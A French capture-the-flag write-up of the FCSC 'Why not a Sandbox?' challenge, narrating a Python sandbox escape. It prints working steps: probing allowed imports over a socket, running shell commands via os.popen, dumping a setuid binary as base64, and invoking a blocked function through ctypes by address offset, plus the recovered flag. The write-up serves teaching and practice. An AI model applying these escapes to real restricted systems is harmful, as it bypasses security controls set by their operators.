# Why not a Sandbox?

Points : 490 (dynamique)

```
Votre but est d'appeler la fonction print_flag pour afficher le flag.

Service : nc challenges1.france-cybersecurity-challenge.fr 4005
```

## Analyse

Avec la description du challenge je me doute qu'il doit y avoir une fonction cachée que je vais devoir trouver.

La description étant assez courte et contenant peu d'informations, je me concentre sur l'environnement.

En se connectant au challenge, je sais que j'ai affaire à la version 3.8.2 de Python :

```bash
[ aether@ysera  ~  % ] nc challenges1.france-cybersecurity-challenge.fr 4005
Arriverez-vous à appeler la fonction print_flag ?
Python 3.8.2 (default, Apr  1 2020, 15:52:55) 
[GCC 9.3.0] on linux
>>> 
```

Grace à cela je peux télécharger la même version sur mon poste et récupérer la liste des libs de base.

## Tentative d'importation

Etant donné que je ne savais pas trop où partir, j'ai décidé de faire un script qui importe chacune des libs et qui me renvoie la liste de celles qui peuveut l'être.

Grace au code suivant j'ai pu récupérer les libs pouvant être importées :

```python
#!/usr/bin/python3

import socket

HOST = "challenges1.france-cybersecurity-challenge.fr"
PORT = 4005

#Fonction pour print et recup le text
def print_recv(tcp):
    recv_data = str()
    while True:
        try:
            recv_data += tcp.recv(1024).decode()
        except socket.timeout:
            print(recv_data)
            return recv_data

#Recuperation des libs de base sous Python-3.8.2
with open("lib.txt") as f:
    lib = f.read().split("\n")

#Creation du socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Connexion a l'hote
s.connect((HOST, PORT))
s.settimeout(0.5)

#Affichage du premier message
print_recv(s)

#Variable pour afficher les logs de fin
logs_details = list()

#Tentative d'importation de toute les libs de base
for _lib in lib:
    #Suppresion de l'extension
    _lib = _lib.replace(".py", "")

    #Creation de la commande
    cmd = "import {0}\n".format(_lib).encode()

    #Lancement de la commande
    s.send(cmd)

    #Recuperation de l'output
    res = print_recv(s)

    if "Action interdite" not in res:
        logs_details.append("[+] Found libs importation : {0}".format(_lib))
    else:
        continue

for _log in logs_details:
    print(_log)
```

output :

```
[+] Found libs importation : abc
[+] Found libs importation : codecs
[+] Found libs importation : ctypes
[+] Found libs importation : encodings
[+] Found libs importation : genericpath
[+] Found libs importation : io
[+] Found libs importation : os
[+] Found libs importation : posixpath
[+] Found libs importation : site-packages
[+] Found libs importation : stat
[+] Found libs importation : struct
[+] Found libs importation : zipimport
```

Je remarque directement la présence de la lib os qui permet potentiellement de récupérer un shell.

## Récupération du binaire

Maintenant que je peux avoir accès à des fonctions du système, je vais essayer de voir le code source du service.

```python
Arriverez-vous à appeler la fonction print_flag ?
Python 3.8.2 (default, Apr  1 2020, 15:52:55) 
[GCC 9.3.0] on linux
>>> import ctypes
>>> import os
>>> print(os.popen('ls -lah').read())
total 40K
drwxr-xr-x 1 root     root 4.0K Apr 25 20:58 .
drwxr-xr-x 1 root     root 4.0K Apr 25 20:59 ..
-r-------- 1 ctf-init ctf   16K Apr 25 20:58 lib_flag.so
-r-sr-x--- 1 ctf-init ctf   15K Apr 25 20:58 spython

>>> print(os.popen('file *').read())
lib_flag.so: regular file, no read permission
spython:     setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c08a5d78169fa47ba5dd1bb38a212aa7b7258212, for GNU/Linux 3.2.0, stripped
```

Malheureusement le fichier est un exécutable, j'essaye de le récupérer en base64 pour le debug en local.

```python
>>> print(os.popen('cat spython | base64').read())
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAgBIAAAAAAABAAAAAAAAAADgzAAAAAAAAAAAAAEAAOAAL
AEAAHAAbAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAaAIAAAAAAABoAgAAAAAAAAgA
[snip]
AAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAA9MgAAAAAAAPcAAAAA
AAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA
```

Une fois en possession de la base64 du binaire je peux écrire le contenu decodé dans un fichier.

```
[ aether@ysera  ~/Documents/FCSC/Pwn/WhyNotSandbox  % ] file spython 
spython: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, BuildID[sha1]=c08a5d78169fa47ba5dd1bb38a212aa7b7258212, for GNU/Linux 3.2.0, stripped
```

## Analyse & Exécution du binaire

Maintenant que j'ai bien pu récupérer le binaire, j'essaye de le lancer.

```
[ aether@ysera  ~/Documents/FCSC/Pwn/WhyNotSandbox  % ] ./spython 
./spython: error while loading shared libraries: lib_flag.so: cannot open shared object file: No such file or directory
```

Il ne trouve pas la lib_flag.so, j'en crée une dans le dossier ```/usr/lib```.

```c
void aether(void)
{
    system("echo Aether");
}
// compiled : gcc -shared -o lib_flag.so -fPIC lib_flag.c
```

Je le relance à nouveau.

Ca ne fonctionne toujours pas, il se lance, n'affiche rien et se ferme. Je le passe dans ghidra.

Dans la fonction ```entry```, je remarque que le binaire lance la fonction ```FUN_00101170``` au démarrage.

```c
  __libc_start_main(FUN_00101170,in_stack_00000000,&stack0x00000008,FUN_001017d0,FUN_00101830,
                    param_3,auStack8);
```

Je regarde ce qu'elle contient et vois très nettement une comparaison de chaîne de caractères avec la fonction ```strcmp```.
"-S", "-B", "-I", ces chaînes ressemblent à des arguments passés à un logiciel.

Je remarque aussi que si les arguments ne sont pas passés, alors le logiciel renvoie 0 et donc se ferme.

```c
  if (((iVar1 != 0) && (iVar1 = strcmp(__s1,"-B"), iVar1 != 0)) &&
     (iVar1 = strcmp(__s1,"-I"), iVar1 != 0)) {
    return 0;
  }
```

Le binaire ne doit donc pas s'exécuter tant que les arguments "-S -B -I" ne sont pas passés en paramètre.

```bash
[ aether@ysera  ~/Documents/FCSC/Pwn/WhyNotSandbox  % ] ./spython -S -B -I
./spython: symbol lookup error: ./spython: undefined symbol: welcome
```

Le binaire fonctionne mais il ne trouve pas la fonction ```welcome```.

Je l'a crée une dans mon fichier lib_flag.so

```c
void welcome(void)
{
    system("echo Bienvenue");
}
```

Le logiciel fonctionne enfin !

```
[ aether@ysera  ~/Documents/FCSC/Pwn/WhyNotSandbox  % ] ./spython -S -B -I
Bienvenue
Python 3.8.0 (default, Oct 28 2019, 16:14:01) 
[GCC 8.3.0] on linux
>>>
```

## Appelle de la fonction print_flag

Après avoir passé un énorme moment à chercher le moyen d'afficher la fonction print_flag, j'ai trouvé une piste intéressante.

La lib ctypes qui peut être importée, m'offre la possibilité de lancer des fonctions contenues dans un fichier ```.so``` chargé.

Etant donné que la ```lib_flag.so``` est chargée avec le logiciel, je ne devrais pas avoir de mal à appeler la fonction.

```python
Arriverez-vous à appeler la fonction print_flag ?
Python 3.8.2 (default, Apr  1 2020, 15:52:55) 
[GCC 9.3.0] on linux
>>> import ctypes
>>> ctypes.pythonapi.welcome()
Arriverez-vous à appeler la fonction print_flag ?
51
>>> ctypes.pythonapi.print_flag()
Exception: Nom de fichier interdit
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.8/ctypes/__init__.py", line 386, in __getattr__
    func = self.__getitem__(name)
  File "/usr/lib/python3.8/ctypes/__init__.py", line 391, in __getitem__
    func = self._FuncPtr((name_or_ordinal, self))
Exception: Action interdite
```

Impossible de lancer la fonction en l'appelant par son nom. Il va donc falloir trouver autre chose.

## Appelle de la fonction via son adresse mémoire

Après de nouvelles recherches, je trouve le moyen d'appeler une fonction via son adresse.

```python
>>> import ctypes
>>> ctypes.cast(ctypes.pythonapi.welcome, ctypes.c_void_p).value
140454317666581
>>> f = ctypes.CFUNCTYPE(ctypes.c_void_p)
>>> func = f(140454317666581)
>>> func()
Arriverez-vous à appeler la fonction print_flag ?
51
```

La fontion ```print_flag``` n'étant pas "callable", je vais devoir me baser sur l'adresse mémoire de la fonction ```welcome``` pour retrouver celle de ```print_flag```.

En faisant quelques tests en local, je me rends compte que l'espace entre deux fonctions qui se suivent est de 24 dans la mémoire.

```python
[ aether@ysera  ~/Documents/FCSC/Pwn/WhyNotSandbox  % ] ./spython -S -B -I
Bienvenue
Python 3.8.0 (default, Oct 28 2019, 16:14:01) 
[GCC 8.3.0] on linux
>>> import ctypes
>>> ctypes.cast(ctypes.pythonapi.welcome, ctypes.c_void_p).value#Récupération de l'adresse mémoire de la fonction welcome
140152376960578
>>> ctypes.cast(ctypes.pythonapi.aether, ctypes.c_void_p).value#Récupération de l'adresse mémoire de la fonction aether
140152376960554
>>> 140152376960578 - 140152376960554#Calcul de l'espace entre les deux adresses
24
```

Alors, j'essaye d'ajouter 24 à l'adresse de ```welcome``` en remote pour exécuter la fonction ```print_flag```.

```
Arriverez-vous à appeler la fonction print_flag ?
Python 3.8.2 (default, Apr  1 2020, 15:52:55) 
[GCC 9.3.0] on linux
>>> import ctypes
>>> ctypes.cast(ctypes.pythonapi.welcome, ctypes.c_void_p).value
140469137453333
>>> f = ctypes.CFUNCTYPE(ctypes.c_void_p)
>>> func = f(140469137453333+24)
>>> func()

```

Le programme plante et ne me renvoie rien...

J'essaye donc de tourner autour de l'adresse de la fonction ```welcome``` pour trouver celle qui appellera la fonction ```print_flag``` correctement.

Après quelques minutes de réflexion et de recherche, je trouve enfin l'index parfait qui me permet d'exécuter la fonction.

```python
Arriverez-vous à appeler la fonction print_flag ?
Python 3.8.2 (default, Apr  1 2020, 15:52:55) 
[GCC 9.3.0] on linux
>>> import ctypes
>>> ctypes.cast(ctypes.pythonapi.welcome, ctypes.c_void_p).value
140391852564757
>>> f = ctypes.CFUNCTYPE(ctypes.c_void_p)
>>> func = f(140391852564757+19)
>>> func()
super flag: FCSC{55660e5c9e048d988917e2922eb1130063ebc1030db025a81fd04bda75bab1c3}
83
```

flag: ```FCSC{55660e5c9e048d988917e2922eb1130063ebc1030db025a81fd04bda75bab1c3}```
